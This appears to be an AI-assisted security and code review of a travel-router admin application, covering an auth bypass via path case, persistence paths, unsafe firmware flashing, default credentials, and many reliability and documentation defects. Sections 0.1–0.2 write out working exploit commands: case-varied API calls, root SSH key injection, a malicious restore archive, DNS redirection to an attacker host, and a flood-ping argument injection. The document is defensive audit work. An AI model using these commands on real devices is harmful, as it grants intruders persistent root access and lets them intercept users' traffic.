---
title: Deep code review — 2026-10-04
date: 2026-10-04
scope: whole repo — backend services, platform/trust boundary, frontend, tests/CI/build, docs↔code, architecture
method: 11 read-only subagent lanes (2 waves) + parent verification of every P0/P1
status: findings reported; remediation in progress on this branch
baseline: f3125f22 (clean tree)
---

# Deep code review — 2026-10-04

> ## Remediation status
>
> Fixes are landing on `fix/deep-review-2026-10-04`. Landed so far:
>
> | Area | Commits | State |
> | ---- | ------- | ----- |
> | P0 auth bypass | `70193d6`, `93e6e2b` | Fixed. `CaseSensitive` routing plus an `auth.PublicPaths` allowlist, with a route-table test. `93e6e2b` repairs a regression `70193d6` introduced — see below. |
> | P0 shipped credentials | `29faf2e` | Fixed. Installer refuses a default root password and verifies the service starts; AdGuard ships no account; uninstall reports surviving live state. |
> | Wireless guarded paths | `286b808`, `087f168` | Fixed. Includes two defects found by reviewing the first attempt. |
> | Network / guards / failover | `f5d331a`, `3633cdd` | Fixed. |
> | VPN / DNS layering / API contract | `f81e4bd`, `db681c4` | Fixed. `db681c4` addresses two P1s found by reviewing `f81e4bd`. |
> | Restore + firmware validation | `f81e4bd`, `3633cdd` | Fixed, with a documented reversal — see "Decision reversal" below. |
> | Frontend truthfulness and safety | `c7a469d`, `4cfc254` | Fixed. |
> | Doc drift | this commit | Fixed where mechanical; a gate now prevents recurrence. |
>
> **Process note.** Every wave was followed by an adversarial review lane whose job was to break
> the work just landed. It did, four times, and those four rounds are commits `93e6e2b`,
> `db681c4`, `087f168` and `3633cdd`. The most serious was in my own first fix: I moved the auth
> middleware onto the `/api/v1` route group believing group middleware is scoped by router. In
> Fiber v3 it is scoped by **path prefix**, so it also intercepted the WebSocket upgrade and the
> public time-sync endpoint — the WebSocket answered 401 and live updates were dead, while every
> "route is protected" test still passed. Both the wiring and the gate that missed it are fixed.
>
> ### Decision reversal you should review
>
> The restore allowlist. The review named `etc/crontabs/root` in an uploaded archive as the exploit
> path, and the first implementation restricted members to `etc/config` and `etc/ppp`. That was
> defence at the wrong layer: it was written to compensate for the auth bypass, which is now fixed,
> and restore is an authenticated-admin-only endpoint whose admin already holds root via
> `POST /system/ssh-keys`, firmware flash and factory reset. Worse, **this application itself
> writes** `/etc/crontabs/root`, `/etc/dropbear/authorized_keys` and `/etc/shadow`, all of which
> `sysupgrade -b` captures — so the allowlist refused every genuine backup taken on this device. It
> is replaced by an authenticity check (the archive must carry a UCI config member) plus the
> structural checks that matter regardless of who uploads: absolute paths, `..` traversal,
> symlinks/hardlinks/device nodes, member count and size caps. See `ValidateRestoreArchive`.
>
> ### Still open, needs a decision
>
> 1. **The repeater wizard is dead code.** Nothing imports it; the remediation plan advertises its
>    rollback as delivered. Mount it or delete it — I did not choose, because it is a product call.
> 2. **`SetRadioRole("both")` is now refused outright** rather than reconciled. Smaller and safer,
>    but it changes what an operator can do. Reverting to a reconciling implementation is a
>    deliberate choice, not an oversight.
> 3. **Kill-switch ownership, split-tunnel interaction, and whether `dest=wan` is the right scope**
>    are open product questions, untouched.
> 4. **Not yet done:** `.mise.toml`/Docker `node` version divergence, `oxlint --type-aware` never
>    being invoked, coverage thresholds, `deploy-local.sh` not pruning `/www/travo`, and
>    `setup-local.sh` still disabling SSH host-key verification.
> 5. **Unverifiable without the device:** whether ath11k reports an access point as up with zero
>    associated stations. `ConfirmApply` now depends on that answer for every AP config. This is the
>    single largest unknown in the branch and must be checked on hardware before release.

Follow-up to [`2026-09-26-critical-code-review.md`](./2026-09-26-critical-code-review.md).
**No files were modified.** The device `192.168.1.1` was unreachable throughout, so this is
static analysis plus local test/lint runs — no on-device validation.

## Method

11 lanes, fresh context, read-only: 8 domain lanes in wave 1 (wireless / VPN-DNS-captive /
network-failover / backend trust boundary / frontend data / frontend UI / tests-CI-build /
docs-vs-code), then 3 in wave 2 (adversarial security synthesis, architecture challenge,
adversarial second opinion on contested claims).

The parent agent independently re-verified every P0 and the highest-impact P1s by reading the
cited code and, for the top finding, by running a throwaway test (since deleted). A dedicated
second-opinion lane then tried to **refute** eleven contested P1s; where it succeeded the finding
is marked *partially refuted* below, and several headline claims were narrowed as a result.

## Measured baseline

| Check | Result |
|---|---|
| `go build ./...`, `go test ./...`, `go test ./... -race` (go1.27.1) | **pass**, 11/11 pkgs |
| `golangci-lint run ./...` | 0 issues (only 4 linters enabled) |
| `go mod tidy -diff`, `gofmt -l`, `goimports -l` | clean |
| `pnpm lint` / `lint:ci` | pass, 2 warnings |
| `frontend pnpm test` | 67 files / 397 tests pass (343 s) |
| `shared pnpm test` | 8 files / 61 tests pass |
| `pnpm build`, `pnpm format:check`, `shellcheck` | pass |
| Go statement coverage | 71.9 %, **no threshold enforced** |

**The prior review's headline P0 is false.** `.mise.toml:5` pins `go = "1.27.1"` while
`backend/go.mod:3` says `go 1.27.0`, but nothing breaks: build, tests and `-race` are all green on
1.27.1, and `klauspost/compress` is now `v1.20.1`. The real fix was a dependency bump that no
document records. What remains is cosmetic pin drift (§ Doc drift).

---

# P0 — Critical

## 0.1 The default-deny auth middleware is bypassed by path case: the entire admin API is unauthenticated

**Proven, not inferred.** `internal/auth/auth.go:437-441` gates on
`strings.HasPrefix(c.Path(), "/api/")`. `cmd/server/main.go:229-235` does not set Fiber's
`CaseSensitive`, whose v3 default is `false` — Fiber routes on a lowercased copy but `c.Path()`
returns the original (`fiber@v3.5.0/ctx.go:680-700`).

Throwaway test against the real test app (deleted after the run):

```
GET  /api/v1/system/info      -> 401  ok
GET  /API/v1/system/info      -> 200  >>> HANDLER RAN
GET  /Api/V1/System/Info      -> 200  >>> HANDLER RAN
POST /API/v1/system/ssh-keys  -> 400  >>> HANDLER RAN (body-parse error, auth never ran)
```

ADR 0007 §2 states the middleware is "**default-deny**: only an explicit allowlist bypasses it".
It is allowlist-by-prefix-string instead, and the string does not survive routing normalisation.

**Why it is not caught:** `TestProtectedRouteWithoutToken` sends one canonical-case path.
`openapi_drift_test.go:66-82` walks the route table but filters on the *same*
`HasPrefix(r.Path, "/api/v1/")` assumption it should be checking.

**The class, not just the string.** A second lane built a standalone Fiber app with the identical
middleware and probed every normalisation fasthttp might apply:

| Variant | Result |
|---|---|
| trailing slash, `//`, `%2f`, `.`/`..` segments | **not** bypasses — `c.Path()` is normalised |
| case folding | **bypass** |
| `internal/auth/ip_allowlist.go:67-72` | **same bug**, same `c.Path()` |
| SPA catch-all `main.go:520-525` | same pattern → unknown `/API/v1/...` returns `index.html` 200 instead of the JSON 404 its comment promises |

**Fix (one change closes the class):** attach the middleware to the route group instead of
testing a prefix string, and stop string-matching paths anywhere:

```go
app := fiber.New(fiber.Config{ /* … */ CaseSensitive: true })
// in SetupRoutes: mount ONLY the documented-public endpoints on app
v1 := app.Group("/api/v1", authSvc.Middleware())   // cannot drift from the table
```

Then extend the existing route-table walker to assert, for every registered route, that an
unauthenticated request in canonical **and** case-varied spelling is rejected unless the route is
in the documented-public set.

## 0.2 Behind that bypass: persistence that survives `uninstall.sh`

This is the finding that matters most, because it is not a one-shot reboot. `scripts/install.sh:478-545`
removes only Travo's own files. The following are reachable with no credentials and **are not
removed by the documented uninstall path**:

```bash
# root SSH key → survives uninstall AND a full re-provision
curl -sk -X POST http://192.168.1.1/API/v1/system/ssh-keys \
     -H 'Content-Type: application/json' -d "{\"key\":\"$(cat k.pub)\"}"
ssh -i k root@192.168.1.1          # passwordless root shell

# crontab / init-script / authorized_keys as arbitrary root file writes, via restore
tar czf b.tar.gz etc/crontabs etc/dropbear etc/init.d
curl -sk -X POST http://192.168.1.1/API/v1/system/restore -F 'backup=@b.tar.gz'

# tailscale into the attacker's tailnet, with --accept-routes
curl -sk -X POST http://192.168.1.1/API/v1/vpn/tailscale/auth -d '{"auth_key":"tskey-…"}'

# broadcast an attacker-known PSK (persists in /etc/config/wireless)
curl -sk -X PUT http://192.168.1.1/API/v1/wifi/ap/default -d '{"ssid":"Free","key":"known"}'

# repoint every client's DNS, or poison any LAN name via dnsmasq's local domain
curl -sk -X PUT http://192.168.1.1/API/v1/adguard/config -d '{"content":"dns:\n  upstream_dns: [tcp://attacker]\n…"}'
curl -sk -X POST http://192.168.1.1/API/v1/network/dns/entries -d '{"name":"router","ip":"192.168.1.99"}'
```

Two specifics worth calling out:

- `RestoreBackup` (`system_service.go:670-681`) runs `sysupgrade -r` on the uploaded tarball with
  **no archive validation at all** — no member allowlist, no signature, no size cap. Since a
  `sysupgrade -b` archive is just a tar of relative paths extracted at `/`, any path under `/etc`
  is writable as root. It also writes to a **fixed** `/tmp/restore-upload.tar.gz`
  (`system_handlers.go:158`), so two concurrent restores overwrite each other's payload.
- `GET /api/v1/adguard/config` returns the raw AdGuard YAML **including `users[].password`** —
  the bcrypt hash — so the case bypass turns it into an offline cracking oracle even for a user
  who changed the password.

**Fix beyond closing the gate:** `do_uninstall` must delete `/etc/dropbear/authorized_keys`,
`/etc/hotplug.d/button/50-gui-button-actions`, `/etc/travo/*.json` and `travo.db`, and warn about
non-stock lines in `/etc/crontabs/root`; log every `AddSSHKey` with the client IP; validate restore
archives against a member allowlist and reject symlinks/`..`/absolute paths and decompression bombs.

## 0.3 Unauthenticated firmware flash = permanent brick

`POST /API/v1/system/firmware/upgrade` validates only `strings.HasSuffix(filename, ".bin")`
(`system_handlers.go:192-194`). `keep_settings` defaults to **true**, so a junk `.bin` is the
textbook OpenWrt brick — and on a travel router there is no serial console to recover it. The flash
runs in a background goroutine after the 200 (`system_service.go:720-726`), so the handler reports
success before sysupgrade has validated anything. Fix: parse the image header, show
`supported_devices`, reject a mismatch, and require explicit confirmation.

## 0.4 The documented install one-liner silently sets the root password to `admin`

`scripts/install.sh:397-410`: when stdin is not a TTY — which is exactly the documented
`wget -O- … | sh` path (`README.md:26`) — the interactive prompt is skipped, `PASSWORD` is empty,
and `_pw="admin"` becomes the **root/LuCI/SSH** password, with no warning. The API enforces
`MinPasswordLength = 8` (`auth/auth.go:385`); the installer enforces nothing. Fix: fail closed in
non-interactive mode rather than defaulting.

## 0.5 AdGuard ships a published `admin` / `password` credential on `0.0.0.0:3000`

`packaging/adguard/AdGuardHome.yaml:5-9` binds `0.0.0.0:3000` with a committed bcrypt hash, and
`README.md:33-34` **prints the plaintext**: "Default AdGuard credentials: `admin` / `password`".
`scripts/install-adguard.sh:200` prints it again. Any LAN client — a hotel guest, a café customer,
a compromised gadget — gets the AdGuard admin UI: full query log of the traveller's traffic,
upstream-resolver control, and filter rewrites. `session_ttl: 720h` means a stolen cookie is good
for 30 days. This is a strictly weaker posture than LuCI on the same LAN. Fix: generate a random
password at install time and print it once; bind the UI to loopback behind Travo's authenticated proxy.

---

# P1 — High

## Wireless

1. **`SetRadioRole(radio, "both")` commits AP+STA on one PHY**, the state ADR 0002 §2 says is
   enough to crash ath11k/IPQ6018. `validateWirelessConsistency` (`wifi_service.go:281-305`) only
   counts `mode=sta`+`network=wwan` sections and is radio-blind, so the repeater reconcile is never
   consulted on this path and `allow_ap_on_sta_radio` is bypassed entirely. The UI offers
   "Both (repeater)" at `pages/wifi/wifi-radio-hardware-card.tsx:122`. *(Second opinion: CONFIRMED.)*
2. **Every radio-role change silently reverts.** `wifi_handlers.go:339` is the only wireless
   mutator returning `c.JSON(result)` instead of `wifiMutationResponse(result)` (all 11 others use
   it). `WirelessApplyResult` (`wifi_service.go:167-175`) has no JSON tags, so the body is
   `{"Token":…}`; the frontend reads `response.apply` (`hooks/use-wifi.ts:312` →
   `lib/wifi-apply.ts:57`), gets `undefined`, never confirms, and rpcd's 30 s rollback reverts.
   A generated WPA key is also never shown to the user.
3. **The rollback "proof of reachability" never happens.** `architecture.md:66-67` and ADR 0002 §5
   require confirm only after the caller proves the router is reachable. `ConfirmApply`
   (`wifi_service.go:328`) verifies nothing, and `lib/wifi-apply.ts:24` confirms immediately. A user
   on Ethernet confirms instantly, cancelling the rollback of a config that would not have come up.
4. **The auto-reconnect script runs `wifi up` unguarded, every minute, forever.**
   `wifi_reconnect.go:60-84` writes its crash guard and its `MAX_FAIL=5` counter into `/etc/trafo`
   without `mkdir -p` and without `set -e`. Nothing in `packaging/`, `install.sh`, or startup
   creates that directory. Both writes fail silently, so the one sanctioned `wifi up`
   (ADR 0002 §6) runs unbounded with neither guard nor bound. *(Second opinion: CONFIRMED — neither
   packaging nor install pre-creates `/etc/trafo`.)*
5. **The toggle helper commits before it stages the snapshot, so its rollback is a no-op.**
   `wifi_toggle_script.go:110` commits `wireless`; `:147` then copies the *already-committed* file
   into the rpcd session; `fail()` at `:86` runs `uci revert wireless`, which cannot undo a commit.
   ADR 0002 §6.1 documents this as a working rollback. *(Second opinion: CONFIRMED on the
   revert-is-a-no-op half; UNCONFIRMED whether rpcd's own baseline is the session copy.)*
6. **Band switching: `check_interval_sec: 0` in the config file panics the whole backend.**
   `loadConfig` (`band_switching_service.go:110-118`) skips validation, so `time.NewTicker(0)`
   (`:146`) panics at `Start()` — taking the API, WS and every service with it. Separately,
   `up_switch_delay_sec` is parsed and never used. *(Second opinion: CONFIRMED panic; the
   "no hysteresis" headline was REFUTED.)*
7. **Startup AP repair re-enables radios the WiFi schedule deliberately turned off.**
   `ap_health.go:93-107` sets `disabled=0` on any radio whose AP iface is enabled, 30 s after boot
   (`main.go:349-364`). A restart during an "off" window silently reverts the schedule's config;
   the next reboot or any LuCI Save & Apply brings WiFi back on against the user's schedule.

## VPN, DNS, captive

8. **A second VPN enable corrupts the DNS snapshot, permanently killing LAN DNS.**
   `enableVpnDNSForwarding` (`vpn_service.go:881-896`) snapshots the *current* dnsmasq state
   unconditionally. Enable VPN → reboot (or just press the toggle twice from the dashboard and the
   VPN page) → the second enable snapshots the VPN's own `server=10.8.0.1, noresolv=1` → the later
   disable restores that → tunnel down, `noresolv=1`, no reachable resolver. Unrecoverable without
   hand-editing `dhcp` in LuCI. *(Second opinion: CONFIRMED.)* Snapshot writes are also `_ =`
   ignored, so a read-only overlay proceeds to `noresolv=1` with nothing to restore.
9. **Tunnel loss has no DNS self-heal** — `disableVpnDNSForwarding` is the only restore
   entrypoint, so a hotel-Wi-Fi flap leaves every LAN client SERVFAILing until the operator
   toggles the VPN off. *(Second opinion: CONFIRMED, but by design rather than defect — the
   restore-entrypoint finding stands.)*
10. **`disableWireguard` tears down nothing when the default route is missing** —
    `vpn_service.go:787-790` returns before `teardownWireGuardFirewall()`, so the `wg0` zone and
    `lan→wg0` forwarding survive in `/etc/config/firewall` across reboots.
11. **AdGuard `SetDNS(false)` permanently deletes the user's dnsmasq `server` list with no
    snapshot** (`adguard_service.go:387-391`), destroying hand-added split-DNS entries.
    *(Second opinion: data loss CONFIRMED; the port-53 self-loop claim was REFUTED.)*
12. **`PUT /api/v1/network/doh` is a security toggle that does nothing.** It writes
    `/etc/travo/doh-config.json`, discards the computed provider URL (`network_service.go:1564`),
    commits nothing, restarts dnsmasq, and answers `200 {"ok":true}`. No `https-dns-proxy` wiring
    exists anywhere. *(Second opinion: CONFIRMED; the UI-copy claim is partially refuted —
    the card does show the provider is unapplied — but the success toast does not.)*
    The dnsmasq restart is also an unguarded live-state mutation.

## Network, failover, firewall

13. **`deleteManagedSections` deletes every mwan3 `interface` section, including hand-written
    ones** (`failover_service.go:601-612, 679-693`). A user's `config interface 'hotel'` is removed
    on the next failover save with no log line, and the backup is only read on the failure path.
    This directly contradicts ADR 0005 §1's `travo_` namespacing. *(Second opinion: CONFIRMED —
    deliberate for candidates, but the blast radius is wider than the ADR admits.)*
14. **`USBTetheringService` deletes its crash guard on every failure path**
    (`usb_tethering_service.go:277-300, 329-348`), leaving an unzoned live `network.usbtether`
    and a staged `firewall` delta with no recovery marker. Violates ADR 0003 §1.3. *(CONFIRMED.)*
15. **`FailoverService` sits entirely outside the ADR 0010 lock model** — no `mutateUCI` or
    `withConfigLocks` anywhere in the file — yet its rpcd apply snapshots and reloads `network`
    (`mwan3UCIConfigs` at `:844`), racing concurrent WiFi/WAN applies. Worse, `SetConfig`'s
    config-write failure path (`:248-251`) calls `restoreManagedSections` **before the guard is
    written and before anything is mutated**, so an ENOSPC produces a live mwan3 rewrite with no
    marker. *(Second opinion: rule violation CONFIRMED, the unguarded mutation is a new P1.)*
16. **`BlockClient`/`UnblockClient` perform an unlisted direct `commit firewall` +
    `/etc/init.d/firewall restart`** (`network_service.go:1135-1182`). ADR 0004 §5 says verbatim
    that "unlisted direct firewall commits are a defect". The restart drops every established
    flow including the operator's own session.
17. **`PUT /network/wan` validates then silently discards `mtu` and `dns_servers`**
    (`network_service.go:767-790` writes only proto/ip4addr/netmask/gateway), and `type: "pppoe"`
    produces a WAN that can never authenticate — no username, password or metric. Both are
    documented in the OpenAPI body and read-modify-written by the UI.
18. **`DELETE /network/dns/entries/@dnsmasq[0]` deletes and commits the entire dnsmasq config.**
    `network_handlers.go:266-275` passes `:section` through unchecked; `uci/real.go:24` deliberately
    allows anonymous `@type[N]` references. The same via `/network/dhcp/reservations`.

## Frontend

19. **The repeater wizard is unreachable dead code.** Nothing outside
    `components/wifi/repeater-wizard/` and its tests imports `RepeaterWizard`. The remediation
    plan advertises "repeater rollback" as delivered; `docs/_archive/requirements_done.md:137`
    records the wizard as shipped. The repo asserts three mutually inconsistent things.
20. **The lockout-recovery copy points at a feature that does not exist.**
    `wifi-mode-switch-dialog.tsx:148,151` and `confirm-radio-disable-dialog.tsx:97` tell the user
    to "Enable Emergency AP in advanced settings" on the exact screen where it matters. A
    repo-wide grep finds only those three strings — no route, no type, no page.
21. **Config cards render editable forms pre-filled with hard-coded defaults when the GET
    fails**, so a single failed read turns Save into silent config loss.
    `dhcp-pool-settings-card.tsx:22-27` shows `100 / 150 / 12h`; changing only `limit` and saving
    overwrites the user's real start address and lease time. `lan-dns-settings-card.tsx:26-31` is
    worse — a failed read shows "custom DNS off", so Save discards the existing resolvers.
    Fix: gate the form on `data !== undefined`, not on `!isLoading`.
22. **WiFi Schedule can lock a WiFi-connected user out with no warning.** Setting an off-time while
    connected over WiFi disconnects the admin UI at that hour with no confirmation — and
    `useConnectionMethod()` already exists to detect exactly this.
23. **Every multi-band AP write has no rollback.** `ap-unified-config-form.tsx:116-140` and
    `setup/ap-step.tsx:31-67` loop over sections; if band 2 fails, band 1 is already applied and
    committed. The user gets an amber "bands differ" banner and must retype the old values by hand.
24. **The WiFi mode switch — the highest-risk action in the app — gives zero feedback for 30 s**
    after telling the user to keep the page open. The dialog closes on the same tick as the click;
    the only output is a toast at the end of the rollback window. `OperationProgressDialog` already
    exists and is already used by the VPN section.
25. **Service "Remove" starts the uninstall on the first tap** — no confirm dialog, no typed gate,
    next to Start/Stop at 32 px in a wrapping row (`service-card-action-buttons.tsx:83-88`).
26. **Failed queries render as confident false statements.** One failed GET produces "WireGuard is
    not installed", "Tailscale is not installed", "WAN not configured", "No clients connected",
    and a red "Internet: Unreachable" on the dashboard — with no error styling anywhere.
    `isError` is not destructured in a single `pages/**` file; `InlineError` is used in 4 places.
27. **WebSocket reconnect loops forever on a dead token.** The server deliberately closes with
    code 1008 "session is no longer valid" (`ws/handler.go:112-124`) *so the client stops
    reconnecting*, but `ws-context.tsx:122` never reads the `CloseEvent`. Fixed 3 s cadence, no
    backoff. It only stops because an unrelated 30 s session poll happens to produce a 401.
28. **OpenAPI drift, three ways.** `PUT /system/leds` documents `enabled` while the handler binds
    `stealth_mode` with the permissive binder — so the documented request is accepted, ignored, and
    answered `200 {"ok":true}` after doing the *opposite* of what was asked. `/system/time-sync`
    documents `timestamp` while the handler requires `client_time_ms` (400 naming a field the
    caller never sent). Five endpoints document response shapes the handlers do not produce
    (including two `text/event-stream` typos for `application/x-ndjson`).
29. **`PUT /wifi/repeater-options` uses the permissive binder** (`wifi_handlers.go:229`) — the only
    one of 19 whole-config PUTs that does. A camelCase spelling is silently ignored and `200`
    returned, defeating the documented `allow_ap_on_sta_radio` escape hatch.

## Tests, CI, build, deploy

30. **`MockUCI.AddList` overwrites where real `uci add_list` appends** (`uci/mock.go:175-183`,
    with the admission in its own comment), and five production call sites are inside loops:
    split-tunnel `allowed_ips` (`vpn_service.go:233, 1820`), mwan3 `use_member` and `track_ip`
    (`failover_service.go:728, 786`), firewall `zone_wan.network` (`wifi_service.go:679`).
    Replacing any loop with a single `Set` keeps every test green while silently dropping routes.
    Multi-element list semantics have **zero** coverage.
31. **Most `failover_service` tests exercise a no-op.** `applyMwan3` returns `nil` whenever
    `/etc/init.d/mwan3` is absent (`failover_service.go:881-883`) — which it always is off-device.
    Only two test helpers stub it. A bug anywhere in the 60-line policy-generation block is
    invisible to CI, and `TestFailoverServiceSetConfigWritesManagedSections` asserts only section
    *presence*, never contents.
32. **`install.sh` reports "travo is running" unconditionally** (`scripts/install.sh:445-447`):
    `start 2>/dev/null || true` then `success`. No port probe, no `pgrep`, no HTTP check —
    while `deploy-local.sh:220-244` *does* implement exactly that verification. There is no
    shell-test framework in the repo at all.
33. **`deploy-local.sh` never prunes `/www/travo`.** Vite emits content-hashed filenames and deploy
    extracts over the old tree without `--delete`. Forty deploys during UI iteration fill a
    100–200 MB overlay, after which `uci commit` starts failing and the device needs a reflash.
34. **The ADR 0003 guard list is duplicated in three files with no consistency test** — the Go
    constants, `install.sh:387-392`, and `deploy-local.sh:209-212`. `guards_test.go:19` even names
    the coupling and asserts nothing about it. A new guard added in Go and forgotten in shell means
    a feature silently dead after an upgrade, forever.
35. **`setup-local.sh:46` still hardcodes `StrictHostKeyChecking=no UserKnownHostsFile=/dev/null`** —
    the remediation fixed 5 of 6 call sites. That script installs your SSH public key, on exactly
    the hostile-network scenario a travel router lives in.
36. **`oxlint-tsgolint` is installed but never invoked.** No script passes `--type-aware`, so every
    type-aware rule in `.oxlintrc.json` is inert and the six findings fixed in `214e0ed` can
    regress silently.

---

# P2 — Selected

Condensed; full list is in the lane reports.

- `RunDiagnostics` passes an unvalidated `target` as argv to `ping`/`traceroute`/`nslookup` —
  `{"target":"-f"}` is a root flood ping. No shell, so argument injection only.
- `POST /usb-tether/configure` accepts `eth0` or `lan`; `isUSBInterface` exists and is only used by
  `GetStatus`, never by `Configure`.
- `SQMService.SetConfig` writes UCI with no config lock; `Apply()` restarts `sqm` with no guard.
- `ServiceManager.Start/Stop` run `init.d` directly with no guard; nothing ever checks the
  `pkg-install` guard, so a half-finished install from a power cut is silently retried.
- `stats_history.Flush` discards the bbolt write error and resets the batch counter before the
  write lands — the "silent degradation" ADR 0009 warns about.
- `failover.json` is written with a truncating `os.WriteFile` while a 10 s monitor reads it → a
  500 on a valid config, and a truncated file on flash after a power cut.
- `AlertService.SetCarrierChecker` and `auth.bcryptCost` are unsynchronised (both benign today).
- `RealUCI.GetSections` treats any error containing "not found" as "config absent".
- `wifi_reconnect.go` picks the STA radio by Go map iteration order when no band is supplied.
- `ensureSTASectionForScan` discards `uci set` errors — the exact class already fixed in `Connect`.
- Repeater `wifi-mode` / `repeater-options.json` are persisted *outside* the apply/confirm window,
  so an unconfirmed apply leaves the mode file lying about the device.
- `auth.json` corruption silently rotates the JWT secret with no log line (safe direction, costly
  diagnosis on a device with no console).
- `blocklist` has no size cap; a valid-but-compromised token can grind flash writes.
- No `X-Frame-Options`/CSP/`Referrer-Policy` anywhere; the admin token lives in `localStorage`.
- Dark-mode primary buttons fail WCAG AA (3.68:1 on `blue-500`); one dialog title is a hardcoded
  `text-red-600` with no dark variant (AGENTS.md violation).
- All `animate-in`/`zoom-in-95` utility classes are dead — the animate plugin is not installed,
  confirmed against the built CSS.
- Ten API routes have no MSW handler and `onUnhandledRequest: 'bypass'`, so those screens hit the
  network in dev and any new test asserts against reality rather than a fixture.

---

# Doc drift

Quantified, because `[x]` marks in this repo are demonstrably unreliable.

**False completion records** (sampled 21 claims, 4 false, 3 partial):

- `docs/plans/2026-09-28-critical-review-remediation.md:21-24` claims `.mise.toml` was pinned to
  go1.27.0 and marks it `[x]`. It says 1.27.1 — and the P0 it claims to fix is not reproducible.
- The same plan (`:157-159`) lists as still-open two guard problems that are already fixed
  (`guards.go:17`, `deploy-local.sh:209-213`, `failover_service.go:176`).
- `architecture.md:90` names a guard-enforcement test, `TestCrashGuardsAllLiveUnderEtcTrafo`, that
  does not exist. The real tests assert *constants* and scan Go source for literal strings — so a
  guard composed at runtime from a config path (exactly `failover_service.go:155`) sails past both.
- All 18 `file:line` citations in ADR 0003 §2's guard table are stale by 1–56 lines.

**Path errors:**

- The bbolt store is documented at `/etc/trafo/travo.db` in **7 places**; the code writes
  `/etc/travo/travo.db` (`main.go:275` + `config.go:35`). Only ADR 0009 — the one written by hand —
  is right. This is the `/etc/travo`→`/etc/trafo` find/replace having hit non-guard state.
- `AGENTS.md:99` — the file `CLAUDE.md` nominates as the single source of agent instructions —
  still tells every agent to write guards to `/etc/travo/<feature>-in-progress`. `guards_test.go`
  only scans `.go` files, so it passes.
- `docs/testing.md:333` tells the on-device playbook to look for stuck guards in `/etc/travo`;
  ADR 0003 says `ls /etc/trafo` is the first check. The playbook cannot detect the failure it exists for.
- `architecture.md:77` and ADR 0002 §6.1 document the WiFi schedule at
  `/etc/cron.d/openwrt-gui-wifi-schedule`; `wifi_reconnect.go:137-148` documents at length that
  `/etc/cron.d` **does not exist on OpenWrt** and that the correct target is `/etc/crontabs/root`.
  A maintainer trusting the ADR would reintroduce a schedule that never fires while the UI says enabled.
- `+ Start here.md` — the hub AGENTS.md calls the default retrieval path — omits ADR 0010 and 0011.
  The two ADRs that changed the most code are the two the default path hides.
- `docs/plans/README.md` claims to be a searchable catalog of all plan docs and is missing 10 of
  them, including the current remediation plan.

**Undocumented shipped surface:** `POST /network/diagnostics`, `GET /network/uptime-log`,
`GET|PUT /network/doh`, `/system/setup-complete`, `/system/ntp/sync`,
`/network/connection-method`, `/network/wan/detect`. Also: the sysupgrade backup scripts preserve
`auth.json` but **not** `travo.db`, so persisted revocations silently die on firmware upgrade —
ADR 0009 requires them to survive a *reboot* and says nothing about an upgrade.

**Feature gaps — backlog honesty.** `tasks_open.md` is largely accurate; nothing is implemented but
listed as open. The real debt is the inverse: three of its six Open Questions were answered in code
and never recorded (Q3 startup safety net is `EnsureAPRunning`; Q4 AdGuard DNS topology shipped;
Q2 WAN/WWAN coexistence was decided as mwan3 policy routing, not metrics), so they keep being
re-litigated. And **multi-WAN failover has never been validated on hardware** — the one feature that
makes a travel router usable across countries ships unverified, and it is not a backlog item at all.

---

# Architecture challenge

Independent lane, asked to argue for alternatives.

**Verdict: the central bet is right.** `uci` CLI + `ubus` + rpcd `apply/confirm` is the correct
interface to OpenWrt, and a single Go/Fiber binary coexisting with LuCI is the right shape for a
128 MB router. Stop second-guessing those. The problem is not the design — it is that three
load-bearing invariants (crash guards, UCI serialisation, apply confirmation) are enforced by
*convention plus source-scanning tests* rather than by a type, an adapter, or a single table.

Every confirmed P1 has the same shape: **the rule is written in an ADR, the code duplicates the
rule, and the duplication drifts.** That is one bug class wearing thirty costumes.

Seven challenges, ranked by (impact × confidence) / cost:

1. **Crash guards — a good idea implemented sloppily, at the wrong abstraction.** The mechanism
   itself is sound (marker file + remove-on-success + manual redeploy as the retry path). But it
   leaks in every direction: guards cleared on failure paths, a guard whose directory may not
   exist, a guard list in three files, ADRs naming the old directory, and a `config-system` rule
   that is written down but never tested. **Alternative:** one append-only journal of in-flight
   operations (`/etc/trafo/journal/`), written before the first mutation and truncated on success,
   so "is anything in flight?" is a directory listing rather than a per-feature convention — and
   `deploy-local.sh` becomes "clear the journal". This deletes the ADR 0003 table *and* the shell
   guard lists, i.e. it makes the drift class unrepresentable rather than merely tested for.
2. **UCI serialisation — right invariant, wrong enforcement point.** The enforcement is two
   source-scanning tests keyed off *function names*, which is why `FailoverService` and
   `SQMService` (which call neither helper) are invisible to both. The real hazard is the
   process-global `/tmp/.uci/<config>/changes` delta. **Alternative:** make the mutation primitive
   the only way to write config — one interface that takes the config list and owns both the lock
   and the revert, so a service physically cannot bypass it. Cheaper interim: extend the existing
   scanner's regex to `withConfigLocks` and make it fail the build on any UCI write outside the
   two helpers.
3. **DNS layering — three snapshot/restore implementations that disagree.** VPN, captive and AdGuard
   each reimplement snapshot → mutate → restore, and the review found they conflict: AdGuard's
   disable deletes a list the VPN snapshot still claims; a second VPN enable snapshots the VPN's own
   state. **Alternative:** one declarative resolver-state reconciler — "LAN DNS should resolve via X,
   with Y as fallback" — with a single snapshot owner. This is the largest single simplification
   available and it deletes real bug classes rather than individual bugs.
4. **"Browser confirms" is the right idea at the wrong boundary.** The trust model is sound —
   whoever can reach the device after the change proves survival. But the implementation confirms on
   *API reachability*, so a user on Ethernet always confirms; one endpoint cannot confirm at all;
   and internal paths use `ApplyAndConfirm` anyway, so the rule varies per endpoint without being
   written down. **Alternative:** move the proof server-side — `ConfirmApply` verifies the radio is
   actually up (the health probe already exists at `/wifi/health`) before cancelling the rollback
   window. A client cannot then bypass it, and the browser keeps its 30 s window.
5. **Shared types are hand-written twins of the Go models.** Every type-drift bug in this review
   (`NetworkInterface.type`, the OpenAPI field mismatches) is a hand-maintained duplicate.
   **Alternative:** generate `shared/` from the OpenAPI spec, which is already a tested contract
   with a drift gate. This removes an entire error class at the cost of one codegen step.
6. **Process shape — keep one binary, stop hosting the flash in it.** Firmware upgrade and factory
   reset should not share an address space with the API they are about to kill; a crash mid-flash
   currently takes the thing that reports the crash. Low urgency, high consequence.
7. **Test strategy — mocks that lie.** `MockUCI.AddList` overwrites where real UCI appends, and the
   failover suite is green by construction because `/etc/init.d/mwan3` does not exist off-device.
   **Alternative:** a shared in-memory UCI fake that models list multiplicity and the shared
   `/tmp/.uci` delta (which `network_concurrency_test.go` already does well — it just isn't reused),
   plus an `initScript` seam on the failover constructor. This is the highest leverage test change
   in the repo.

**Delete:** the ten `_*-report.md` scratch files in `docs/plans/` and regenerate that index (a
